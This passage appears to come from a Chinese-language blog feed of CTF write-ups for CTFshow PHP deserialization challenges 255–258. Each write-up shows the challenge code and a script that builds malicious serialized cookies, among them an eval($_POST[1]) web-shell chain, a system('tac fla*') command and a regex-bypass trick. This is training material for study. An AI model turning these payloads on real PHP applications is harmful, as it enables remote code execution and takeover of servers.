<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析题目，发现就在上一题的基础上加入了对cookie值的正则判断。</p><ol><li><code>/[oc]:\d+:/i</code>是一个正则表达式模式。它由以下几个部分组成：<ul><li><code>[oc]</code>：字符类，表示匹配字母 “o” 或字母 “c”。</li><li><code>:</code>：表示匹配冒号字符。</li><li><code>\d+</code>：表示匹配一个或多个数字字符。</li><li><code>:</code>：表示再次匹配冒号字符。</li><li><code>/i</code>：正则表达式标志，表示不区分大小写匹配。</li></ul></li></ol><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:11&#x27;</span>, <span class="string">&#x27;:+11&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:8&#x27;</span>, <span class="string">&#x27;:+8&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在数字前加 ‘+’号，可以绕过该正则原因：</p><p>在进行反序列化时，PHP 会依据提供的长度信息来解析对象和属性。如果长度信息与实际字符串的长度不匹配，PHP 反序列化过程中可能会出现解析错误或者异常。</p><p>通过将 <code>+</code> 符号添加到长度值之前，可以避免长度计算错误。这样 PHP 解析器将会将 <code>+</code> 符号后面的数字作为字符串的实际长度，而不是将其视为字符串的长度信息。</p><p>传入参数，写入cookie,输入POST参数，即可获得flag：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5/04.png"></p><p>获得flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;<span class="number">7e115</span>ef9-e9df-<span class="number">4</span>df0-bee3-<span class="number">1</span>d65858391d4&#125;</span><br></pre></td></tr></table></figure><p>这题考察了正则表达式的绕过。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-4</title>
      <link href="/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4/"/>
      <url>/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshoe-web入门-php反序列化-257"><a href="#题目来源：CTFshoe-web入门-php反序列化-257" class="headerlink" title="题目来源：CTFshoe web入门-php反序列化-257"></a>题目来源：CTFshoe web入门-php反序列化-257</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析题目，首先找到我们可以利用的东西，也就是可以输出flag或者代码利用的点，这里可以看到是对象 backDoor 中的 echo()。然后发现这题涉及到两个魔术方法，那我们可以线复习一下魔术方法的触发规则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()，类的构造函数,在实例化一个对象时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()，类的析构函数，在对象被摧毁时调用，也就是反序列化之后</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()，执行<span class="title function_ invoke__">serialize</span>()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()，执行<span class="title function_ invoke__">unserialize</span>()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br></pre></td></tr></table></figure><p>弄清规则后，分析，我们想调用exal()函数，就要让 backDoor 对象被实例化，然后可以发现，在实例化 ctfShowUser 时会调用 </p><p>__construct() 魔术方法，这里又会实例化 info 对象，那我们可以将其改为 backDoor 对象，就可以触发exal() 函数。再将 backDoor 对象中 code 的值改成恶意代码，就达到目的了。</p><p>开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;tac fla*&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将不必要的代码都删去。将值写入cookie，再传入参数，即可获得flag。</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4/02.png"></p><p>获得flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;c8397d93-<span class="number">5345</span>-<span class="number">4</span>c3b-<span class="number">9</span>b2a-<span class="number">43149</span>c287cce&#125;</span><br></pre></td></tr></table></figure><p>这题也比较简单。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-3</title>
      <link href="/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3/"/>
      <url>/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-256"><a href="#题目来源：CTFshow-web入门-php反序列化-256" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-256"></a>题目来源：CTFshow web入门-php反序列化-256</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题就在上一题的基础上加了一个判断，要求 username!&#x3D;&#x3D;password，还是个弱比较，则我们修改其对应参数即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;321&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再传参和写入cookie即可。（注：传入的参数的值必须和我们序列化的值相同）</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3/01.png"></p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3/02.png"></p><p>即可获得flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;b14976e6-<span class="number">76</span>ea-<span class="number">4</span>db3-<span class="number">9934</span>-e92193359a39&#125;</span><br></pre></td></tr></table></figure><p>这题也非常简单。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-2</title>
      <link href="/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/"/>
      <url>/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-255"><a href="#题目来源：CTFshow-web入门-php反序列化-255" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-255"></a>题目来源：CTFshow web入门-php反序列化-255</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable 